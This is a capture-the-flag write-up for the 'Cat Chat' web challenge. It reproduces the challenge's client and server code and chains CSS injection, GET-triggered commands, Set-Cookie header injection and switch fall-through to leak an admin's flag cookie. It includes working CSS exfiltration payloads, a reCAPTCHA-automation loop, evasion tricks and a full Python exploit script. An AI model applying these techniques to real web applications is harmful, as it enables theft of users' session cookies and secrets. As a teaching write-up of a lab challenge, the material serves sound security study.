# Cat chat writeup

This challenge was straight forward, as it allows us to grab the code of both server and client. This simplifies exploitation a lot, as the final goal is quite clear. As the flag is in an admin cookie, we have to find a way to leak this. Our initial guess was some kind of XSS, but we quickly realised it was not the correct solution.

The website have multiple small vulnerabilities, which together form an elegant exploit chain. The final exploit is built on the following vulnerabilities:

1. CSS injection allows to leak data from the HTML DOM
2. GET requests are accepted for server /send requests
3. HTTP header injection, for the `/secret` Set-Cookie request
4. Omitted break statement in switch, allows for multiple server commands (`/ban` followed by `/secret`)

The exploit uses these vulnerabilities, in order to leak the admin cookie to the admins HTML DOM, and then subsequently leak it to our user.

Each vulnerability, as well as the final exploit chain will be described below.

### Client-side code
As the challenge was a web challenge, we of course had access to the client side code:
```javascript
// Set name
let color = ['brown', 'black', 'yellow', 'white', 'grey', 'red'][Math.floor(Math.random()*6)];
let breed = ['ragamuffin', 'persian', 'siamese', 'siberian', 'birman', 'bombay', 'ragdoll'][Math.floor(Math.random()*7)];
if (!localStorage.name) localStorage.name = color + '_' + breed;

// Utility functions
let cookie = (name) => (document.cookie.match(new RegExp(`(?:^|; )${name}=(.*?)(?:$|;)`)) || [])[1];
let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');

// Sending messages
let send = (msg) => fetch(`send?name=${encodeURIComponent(localStorage.name)}&msg=${encodeURIComponent(msg)}`,
    {credentials: 'include'}).then((res) => res.json()).then(handle);
let display = (line) => conversation.insertAdjacentHTML('beforeend', `<p>${line}</p>`);
let recaptcha_id = '6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu';
window.addEventListener('load', function() {
  messagebox.addEventListener('keydown', function(event) {
    if (event.keyCode == 13 && messagebox.value != '') {
      if (messagebox.value == '/report') {
        grecaptcha.execute(recaptcha_id, {action: 'report'}).then((token) => send('/report ' + token));
      } else {
        send(messagebox.value);
      }
      messagebox.value = '';
    }
  });
  send('Hi all');
});

// Receiving messages
function handle(data) {
  ({
    undefined(data) {},
    error(data) { display(`Something went wrong :/ Check the console for error message.`); console.error(data); },
    name(data) { display(`${esc(data.old)} is now known as ${esc(data.name)}`); },
    rename(data) { localStorage.name = data.name; },
    secret(data) { display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`); },
    msg(data) {
      let you = (data.name == localStorage.name) ? ' (you)' : '';
      if (!you && data.msg == 'Hi all') send('Hi');
      display(`<span data-name="${esc(data.name)}">${esc(data.name)}${you}</span>: <span>${esc(data.msg)}</span>`);
    },
    ban(data) {
      if (data.name == localStorage.name) {
        document.cookie = 'banned=1; Path=/';
        sse.close();
        display(`You have been banned and from now on won't be able to receive and send messages.`);
      } else {
        display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
      }
    },
  })[data.type](data);
}
let sse = new EventSource("receive");
sse.onmessage = (msg) => handle(JSON.parse(msg.data));

// Say goodbye
window.addEventListener('unload', () => navigator.sendBeacon(`send?name=${encodeURIComponent(localStorage.name)}&msg=Bye`));

// Admin helper function. Invoke this to automate banning people in a misbehaving room.
// Note: the admin will already have their secret set in the cookie (it's a cookie with long expiration),
// so no need to deal with /secret and such when joining a room.
function cleanupRoomFullOfBadPeople() {
  send(`I've been notified that someone has brought up a forbidden topic. I will ruthlessly ban anyone who mentions d*gs going forward. Please just stop and start talking about cats for d*g's sake.`);
  last = conversation.lastElementChild;
  setInterval(function() {
    var p;
    while (p = last.nextElementSibling) {
      last = p;
      if (p.tagName != 'P' || p.children.length < 2) continue;
      var name = p.children[0].innerText;
      var msg = p.children[1].innerText;
      if (msg.match(/dog/i)) {
        send(`/ban ${name}`);
        send(`As I said, d*g talk will not be tolerated.`);
      }
    }
  }, 1000);
}
```

## CSS injection allows to leak data from the HTML DOM
Of particular interest we have two lines
```javascript
// The escape function
let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');

// And later in the code
display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
```

The escape function only escapes the characters <, >, " and '. This means that when used in the second line, which is not inside quotes, we can set ```data.name``` to be something like ```a]{} body {background: red} p[id=d```. The final result will be the following valid css, which paints the background of our chat-window red:

```
... was banned.<style>span[data-name^=a]{} body {background: red} p[id=d] { color: red; }</style>
```

We now have an injection in the form of CSS! Using the css property `background-image:url('https://random')` the browser will send a request to the given website. Combined with the CSS attribute selector, it is possible to leak information from the page. However, due to the content security policy (CSP), we are not allowed to access other domains (except google recaptcha):

```
content-security-policy: default-src 'self'; style-src 'unsafe-inline' 'self'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src 'self' https://www.google.com/recaptcha/
```

In order to be able to leak data, we either need to find an open redirect in google recaptcha, or luckily for us, as mentioned below, it is possible to send messages with a GET request.

It is worth noting that this CSS injection only occurs when the admin bans a person. In order to get the admin to ban a person, the admin must be present in our room. We can achieve this by writing ```/report``` in a message. And our target person, then has to write a sentence containing the word 'dog'.

### Server-side code
We were also given access to the server side code:
```javascript
const http = require('http');
const express = require('express');
const cookieParser = require('cookie-parser')
const uuidv4 = require('uuid/v4');
const SSEClient = require('sse').Client;
const admin = require('./admin');
const pubsub = require('@google-cloud/pubsub')();

const app = express();
app.set('etag', false);
app.use(cookieParser());

// Check if user is admin based on the 'flag' cookie, and set the 'admin' flag on the request object
app.use(admin.middleware);

// Check if banned
app.use(function(req, res, next) {
  if (req.cookies.banned) {
    res.sendStatus(403);
    res.end();
  } else {
    next();
  }
});

// Opening redirect and room index
app.get('/', (req, res) => res.redirect(`/room/${uuidv4()}/`));
let roomPath = '/room/:room([0-9a-f-]{36})';
app.get(roomPath + '/', function(req, res) {
  res.sendFile(__dirname + '/static/index.html', {
    headers: {
      'Content-Security-Policy': [
        'default-src \'self\'',
        'style-src \'unsafe-inline\' \'self\'',
        'script-src \'self\' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/',
        'frame-src \'self\' https://www.google.com/recaptcha/',
      ].join('; ')
    },
  });
});

// Process incoming messages
app.all(roomPath + '/send', async function(req, res) {
  let room = req.params.room, {msg, name} = req.query, response = {}, arg;
  console.log(`${room} <-- (${name}):`, msg)
  if (!(req.headers.referer || '').replace(/^https?:\/\//, '').startsWith(req.headers.host)) {
    response = {type: "error", error: 'CSRF protection error'};
  } else if (msg[0] != '/') {
    broadcast(room, {type: 'msg', name, msg});
  } else {
    switch (msg.match(/^\/[^ ]*/)[0]) {
      case '/name':
        if (!(arg = msg.match(/\/name (.+)/))) break;
        response = {type: 'rename', name: arg[1]};
        broadcast(room, {type: 'name', name: arg[1], old: name});
      case '/ban':
        if (!(arg = msg.match(/\/ban (.+)/))) break;
        if (!req.admin) break;
        broadcast(room, {type: 'ban', name: arg[1]});
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
      case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
    }
  }
  console.log(`${room} --> (${name}):`, response)
  res.json(response);
  res.status(200);
  res.end();
});

// Process room broadcast messages
const rooms = new Map();

app.get(roomPath + '/receive', function(req, res) {
  res.setHeader('X-Accel-Buffering', 'no');
  let channel = new SSEClient(req, res);
  channel.initialize();
  let roomName = req.params.room;
  let room = rooms.get(roomName) || new Set();
  rooms.set(roomName, room.add(channel))
  req.once('close', () => { room.size > 1 ? room.delete(channel) : rooms.delete(roomName) });
});

// Broadcast to all instances using Cloud Pub/Sub. For local testing, it's easy
// to skip by commenting it out and patching the broadcast fn below.
var publisher;
pubsub.createTopic('catchat', function() {
  var topic = pubsub.topic('catchat');
  publisher = topic.publisher();
  topic.createSubscription('catchat-' + uuidv4(), {ackDeadlineSeconds: 10}).then(function(data) {
    data[0].on('message', function(msg) {
      msg.ack();
      var room = msg.attributes.room;
      if (!rooms.has(room)) return;
      var msg = msg.data.toString('utf-8');
      console.log(`${room} ^^^`, msg)
      for (let channel of rooms.get(room)) channel.send(msg);
    });
  });
});

function broadcast(room, msg) {
  // for (let channel of (rooms.get(room) || [])) channel.send(JSON.stringify(msg)); // Local broadcast only
  publisher.publish(Buffer.from(JSON.stringify(msg)), {room: room}); // Pub/Sub broadcast
}

// Static files
app.get('/server.js', (req, res) => res.sendFile(__filename));
app.use(express.static(__dirname + '/static/', {fallthrough: false}));

app.listen(8080);
```

## GET requests are accepted for server /send requests (not idempotent)
It is also worth noting that a simple GET-call to our server will trigger the execution of the switch. With all parameters in the url, it can even be made in CSS.

Thus, **to post a message from the admin client**, we would do the following:

1. Write ```/report``` to get admin into the room
2. Make a user with our CSS-payload as the username write a message containing the word 'dog'

Sample:
```css
> /name a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=hello);}
> I like dogs
```
**TODO: Maybe include image**

We are now ready to proceed.

## HTTP header injection, for the `/secret` Set-Cookie request
As we can leak data from the HTML DOM using our CSS injection, we need a way to include the secret cookie to the HTML DOM. Fortunately, calling ```/secret newSecret``` will define a new secret, set it as a cookie, and insert it into our HTML DOM. Looking at its server side implementation, we identify yet another vulnerability, as ```newSecret``` is not escaped. By defining a domain in addition to the value, we set a new cookie instead of overwriting the original flag-cookie. This will effectively print the real flag to the HTML DOM:

```
/secret deadbeef; Domain=foo.web.ctfcompetition.com
```

## Omitted break statement in switch, allows for multiple server commands (`/ban` followed by `/secret`)
However, we have to make the admin call this command. And using the CSS to make a call, will not make the admin client process the response. By carefully inspecting the code, we can see, that the switch-statement does not contain any break-statements. This means, that a call to /ban will fall through to the /secret case, and be rejected by the regex unless carefully constructed. As the regex in each case does not require the keyword to be in the beginning of the string, it can be overwritten. E.g. the regex for matching the secret command should have been ```msg.match(/^\/secret (.+)/)``` instead of ```msg.match(/\/secret (.+)/)```. This means, that we can chain multiple commands, by a single call to the server!

By setting our name to the previous `/secret` payload, the admin will send the following payload to the server, when banning us:
```
/ban /secret deadbeef; Domain=foo.web.ctfcompetition.com
```

This will ban the user but simultaneously make the admin leak his cookie to the HTML DOM. The resulting HTML will look similar to this:

```
<span data-secret="CTF{SOME_SECRET_FLAG_VALUE}">*****</span>
```

Now it is time for extracting it.

## Read the cookie from the HTML DOM and send it as a chat message
Now having CSS injection and having a the secret cookie value in an html element, we are able to leak the secret using CSS attribute selectors. That is a CSS selector of ```span[data-secret^=A]``` will match any span with a ```data-secret``` attribute beginning with the letter A. This can be used to load an url if found:
```css
span[data-secret^=A] {
    background: url(send?name=leaker&msg=A)
}
span[data-secret^=B] {
    background: url(send?name=leaker&msg=B)
}
span[data-secret^=C] {
    background: url(send?name=leaker&msg=C)
}
...
```
Depending on which message is printed to our chat, we can determine one character of the flag at a time. This only requires, that it is the admin who has the above CSS injected. Thus, the admin needs to be present during the whole attack.

## Beating the Google Captcha and ensuring the admin is always present
This step could be done by manually posting the command ```/report``` in the chat-window, but it is of course much more fun to automate. As this is a simple captcha, we can simply point our browser to the chatroom and execute the following javascript in the Developer Console:
```javascript
setInterval(() => {
    grecaptcha
        .execute(recaptcha_id, {action: 'report'})
        .then((token) => send('/report ' + token));
}, 5000)
```

Now an admin will join the room every 5th second. No need for manual hard work. 

## Exploit chain
Now we assemple the whole thing into our automated exploit. To sum up, we do the following:

1. Make the admin join the room using ```/report```
2. Join the chat with a user with our payload as the username
3. Leak the admin flag-cookie to the HTML DOM, by making the admin ban our user
4. Join with a new user, wich has the CSS injection to leak one character of our flag at a time, as his name
5. Ban the new CSS leaking user 
6. Repeat the steps until we have the whole flag

Final payload:
```python

```

## Further improvements to the exploit chain
The following exploit automates the process of retrieving the secret from the chat. This allows it to repeat the CSS injection multiple times, in the same /report admin timespan. This makes it possible for the attacker to retrieve the secret with only two /report requests, and maybe a single one, on a network with lower latency.

It also utilizes two covert tactics.
The first tactic, is simply leaking the secret to an other room, as we control the room defined in the CSS injection.
The second tactic, is setting the CSS `p{color:#fff;}`, which turns all text white. One could also position arguments and similar properties, in order to hide the payloads. As the user reloads the page, all evidences will be gone.

The full almost automatic exploit:
```python

#!/usr/bin/env python3
import requests
import uuid
import urllib
import string
import json
import sys

baseurl = "https://cat-chat.web.ctfcompetition.com"

roomId = str(uuid.uuid4())
leakRoomId = str(uuid.uuid4())

roomUrl = "{}/room/{}".format(baseurl, roomId)
print("Join {}/".format(roomUrl))
leakRoomUrl = "{}/room/{}".format(baseurl, leakRoomId)
print("Leak room {}/".format(leakRoomUrl))

headers = {
    'referer': roomUrl
}

def send(roomUrl, name, msg):
    name = urllib.parse.quote(name)
    url = "{}/send?name={}&msg={}".format(roomUrl, name, msg)
    r = requests.get(url, headers=headers)
    return r

def searchReceive(search, roomUrl, timeout=None):
    r = requests.get("{}/receive".format(roomUrl), stream=True, timeout=timeout)
    for chunk in r.iter_content(chunk_size = None):
        data = chunk.decode('ascii')
        if search in data:
            return data

def genCSSLine(s):
    return 'span[data-secret^=' + s + ']{background-image:url(' + leakRoomUrl + '/send?name=flag&msg=' + s + ');}'

def getCurrentSecret():
    data = searchReceive('"name":"flag","msg":"', leakRoomUrl, 5)
    datapoints = data.split("data: ")
    secretPoint = next(json.loads(point.strip()) for point in datapoints if "CTF" in point)
    return secretPoint["msg"]

arg = str(sys.argv[1]) if len(sys.argv) > 1 else ""
res = "CTF\{" + arg

while True:
    print("Please /report")
    searchReceive("I will ruthlessly ban anyone", roomUrl)
    while True:
        print("Testing with {}".format(res))


        payload  = 'a],p{color:#fff;}'
        payload += ''.join([genCSSLine(res + c) for c in string.ascii_letters + string.digits + "_"])
        payload += genCSSLine(res + "\}")
        send(roomUrl, payload, "dog")

        payload = "/secret deadbeef; Domain=foo.web.ctfcompetition.com"
        send(roomUrl, payload, "dog")

        # We will get a timeout here if the admin has left
        try:
            res = getCurrentSecret()
        except:
            break

        print("Flag is currently {}".format(res))

        if "}" in res:
            print("Found flag: {}".format(res))
            sys.exit()
        res = res.replace("{", "\\{")
```
